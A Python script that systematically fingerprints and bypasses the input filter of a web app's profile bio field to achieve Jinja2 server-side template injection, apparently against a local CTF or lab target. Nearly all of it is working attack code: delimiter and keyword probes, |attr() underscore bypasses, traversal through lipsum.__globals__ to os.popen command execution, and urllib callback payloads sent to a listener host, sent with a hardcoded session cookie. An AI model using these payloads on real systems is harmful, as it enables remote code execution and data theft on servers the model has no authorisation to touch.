#!/usr/bin/env python3
import requests
import urllib.parse
import time

base_url = "http://127.0.0.1:32813"
callback_url = "http://localhost:8888/callback"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVqK6Q.DjdnJP5cp110FpB2UDxmK976cZA"
cookies = {"session": session_cookie}

print("=" * 80)
print("SYSTEMATIC FILTER FINGERPRINTING")
print("=" * 80)

def test_payload(payload_name, raw_payload, description=""):
    print(f"\n[TEST] {payload_name}")
    if description:
        print(f"[DESC] {description}")
    print(f"[PAYL] {raw_payload[:80]}...")
    
    profile_url = base_url + "/profile"
    data = {"bio": raw_payload}
    
    try:
        response = requests.post(profile_url, data=data, cookies=cookies, allow_redirects=False)
        print(f"[STAT] {response.status_code}")
        print(f"[SIZE] {len(response.text)}B")
        
        if response.status_code == 200:
            print("[✓] SUCCESS - Filter bypassed!")
        elif response.status_code == 400:
            print("[✗] BLOCKED - Filter triggered")
        elif response.status_code == 500:
            print("[!] ERROR - Server error (possible partial execution)")
        
        if len(response.text) < 200 and response.status_code != 200:
            print(f"[RESP] {response.text[:100]}")
            
        return response.status_code
    except Exception as e:
        print(f"[ERR] {e}")
        return None

print("\n[PHASE 1] CONTROL TESTS")
print("=" * 80)

# Control: Normal text
ctrl = test_payload("Normal text", "Just a normal bio", "Should always work")

# Control: Special chars but no SSTI
ctrl2 = test_payload("Special chars only", "Bio with <>&\" chars", "Testing HTML special chars")

# Control: URL-like text
ctrl3 = test_payload("URL text", "Visit http://example.com", "Testing URL detection")

print(f"\n[CTRL RESULT] Normal POST: {ctrl == 200}")
print("=" * 80)

print("\n[PHASE 2] TEMPLATE DELIMITER DETECTION")
print("=" * 80)

# Test different delimiters
delimiter_tests = [
    ("Standard {{ }}", "{{ test }}", "Standard Jinja2 syntax"),
    ("No space {{}}", "{{test}}", "No spaces"),
    ("Spaces inside", "{{ test }}", "Spaces after opening"),
    ("Spaces around", "{{ test }}", "Spaces inside"),
    ("Newline", "{{\ntest\n}}", "Newlines inside"),
    ("Tab char", "{{\ttest\t}}", "Tab characters"),
    ("Set then print", "{% set x=1 %}{{ x }}", "Using set statement first"),
    ("Raw tag", "{% raw %}{{ test }}{% endraw %}", "Raw template tag"),
]

delimiter_results = {}
for name, payload, desc in delimiter_tests:
    delimiter_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 3] KEYWORD DETECTION")
print("=" * 80)

# Test individual keywords
keyword_tests = [
    ("Keyword: __class__", "Text with __class__ middle", "Double underscore class"),
    ("Keyword: __init__", "Doc about __init__", "Double underscore init"),
    ("Keyword: __globals__", "Mention __globals__", "Double underscore globals"),
    ("Keyword: os", "OS is good", "Just 'os' word"),
    ("Keyword: popen", "Use popen", "Just 'popen' word"),
    ("Keyword: urllib", "Use urllib", "Just 'urllib' word"),
    ("Keyword: request", "HTTP request", "Just 'request' word"),
    ("Keyword: subprocess", "Use subprocess", "Just 'subprocess' word"),
]

keyword_results = {}
for name, payload, desc in keyword_tests:
    keyword_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 4] BUILDING WITH SAFE OBJECTS")
print("=" * 80)

# Test safe objects that Jinja provides
safe_objects = [
    ("lipsum", "{{ lipsum }}", "lipsum built-in"),
    ("lipsum()", "{{ lipsum() }}", "lipsum function call"),
    ("range", "{{ range(5) }}", "range built-in"),
    ("cycler", "{{ cycler }}", "cycler built-in"),
    ("config", "{{ config }}", "config object"),
    ("request", "{{ request }}", "request object"),
    ("request.args", "{{ request.args }}", "request.args"),
    ("request.cookies", "{{ request.cookies }}", "request.cookies"),
]

safe_results = {}
for name, payload, desc in safe_objects:
    safe_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 5] ATTR() FILTER BYPASS")
print("=" * 80)

# Test |attr() filter to bypass underscore detection
attr_tests = [
    ("attr with __class__", "{{ ()|attr('__class__') }}", "attr filter with class"),
    ("attr with range", "{{ ()|attr('range') }}", "attr filter with range"),
    ("attr string concat", "{{ ()|attr('__' + 'class' + '__') }}", "attr with string concat"),
    ("attr request.args", "{{ ()|attr(request.args.x) }}", "attr with request args (would need ?x=__class__)"),

]

attr_results = {}
for name, payload, desc in attr_tests:
    attr_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 6] GRADUAL TRAVERSAL TESTING")
print("=" * 80)

# Gradual traversal - one step at a time
gradual_tests = [
    ("Step 1: lipsum globals", "{{ lipsum.__globals__ }}", "Access globals from lipsum"),
    ("Step 2: lipsum globals os", "{{ lipsum.__globals__.os }}", "Access os from globals"),
    ("Step 3: os popen", "{{ lipsum.__globals__.os.popen }}", "Access popen from os"),
    ("Step 4: full call", "{{ lipsum.__globals__.os.popen('echo test') }}", "Call popen"),
    ("Step 5: with read", "{{ lipsum.__globals__.os.popen('echo test').read() }}", "Call popen with read"),
]

gradual_results = {}
for name, payload, desc in gradual_tests:
    gradual_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 7] URL-BASED CALLBACK PAYLOADS")
print("=" * 80)

# Direct URL access payloads
callback_tests = [
    ("urllib.urlopen", "{{ urllib.request.urlopen('http://localhost:8888/callback') }}", "Direct urllib"),
    ("config urllib", "{{ config.__class__.__init__.__globals__['urllib'].request.urlopen('http://localhost:8888/callback') }}", "Via config"),
    ("lipsum urllib", "{{ lipsum.__globals__['urllib'].request.urlopen('http://localhost:8888/callback') }}", "Via lipsum"),
    ("cycler urllib", "{{ cycler.__init__.__globals__['urllib'].request.urlopen('http://localhost:8888/callback') }}", "Via cycler"),
]

callback_results = {}
for name, payload, desc in callback_tests:
    callback_results[name] = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n[PHASE 8] DOUBLE ENCODING ATTEMPTS")
print("=" * 80)

# For double encoding, we need to manually double-encode
# The requests library will do one layer of encoding, so we pre-encode

double_encoded_tests = [
    ("Double encoded {{ }}", "%257B%257B%2520test%2520%257D%257D", "Double URL encoded braces"),
    ("Double encoded __class__", "%255F%255Fclass%255F%255F", "Double URL encoded underscores"),
]

for name, payload, desc in double_encoded_tests:
    double_encoded_results = test_payload(name, payload, desc)
    time.sleep(0.2)

print("\n" + "=" * 80)
print("FILTER FINGERPRINT RESULTS")
print("=" * 80)

# Analyze results
blocked_by_delimiter = all([
    delimiter_results.get("Standard {{ }}", 0) == 400,
    delimiter_results.get("No space {{}}", 0) == 400,
])

blocked_by_keyword = any([
    keyword_results.get("Keyword: __class__", 0) == 400,
    keyword_results.get("Keyword: os", 0) == 400,
])

safe_objects_work = any([
    safe_results.get("lipsum", 0) == 200,
    safe_results.get("config", 0) == 200,
    safe_results.get("request", 0) == 200,
])

attr_filter_works = any([
    attr_results.get("attr with __class__", 0) == 200,
    attr_results.get("attr string concat", 0) == 200,
])

print(f"[ANALYSIS]")
print(f"  Delimiter blocking: {blocked_by_delimiter} (blocks {{ }})")
print(f"  Keyword blocking: {blocked_by_keyword} (blocks suspicious words)")
print(f"  Safe objects work: {safe_objects_work} (can access built-ins)")
print(f"  Attr bypass works: {attr_filter_works} (can bypass underscores)")

if blocked_by_delimiter:
    print("\n[CONCLUSION] Strong delimiter filter - blocks all {{ }} syntax")
    print("[RECOMMENDATION] Try:")
    print("  1. Different delimiters (%% {{% etc)")
    print("  2. Template escaping ({% raw %})")
    print("  3. Comments inside delimiters")
    print("  4. Alternative template engines")

if not attr_filter_works:
    print("\n[CONCLUSION] |attr() filter also blocked")
    print("[RECOMMENDATION] Try:")
    print("  1. request.args to inject attribute names")
    print("  2. String concatenation with |join")
    print("  3. Format strings")

# Final summary
all_results = {
    **delimiter_results,
    **keyword_results,
    **safe_results,
    **attr_results,
    **gradual_results,
    **callback_results
}

successful = [k for k, v in all_results.items() if v == 200]
blocked = [k for k, v in all_results.items() if v == 400]
errors = [k for k, v in all_results.items() if v == 500]

print(f"\n[SUMMARY]")
print(f"  Successful: {len(successful)}")
print(f"  Blocked: {len(blocked)}")
print(f"  Server Errors: {len(errors)}")

if successful:
    print(f"\n[✓] WORKING PAYLOADS:")
    for s in successful:
        print(f"    - {s}")

if errors:
    print(f"\n[!] ERROR PAYLOADS (may have executed):")
    for e in errors:
        print(f"    - {e}")

print("\n" + "=" * 80)
print("Callback monitoring: Check http://localhost:8888 for requests")
print("=" * 80)

# Return the results for next steps
print("\n[DATA] Results for programmatic access:")
print(f"DELIMITER_RESULTS = {delimiter_results}")
print(f"KEYWORD_RESULTS = {keyword_results}")
print(f"SAFE_RESULTS = {safe_results}")
print(f"ATTR_RESULTS = {attr_results}")
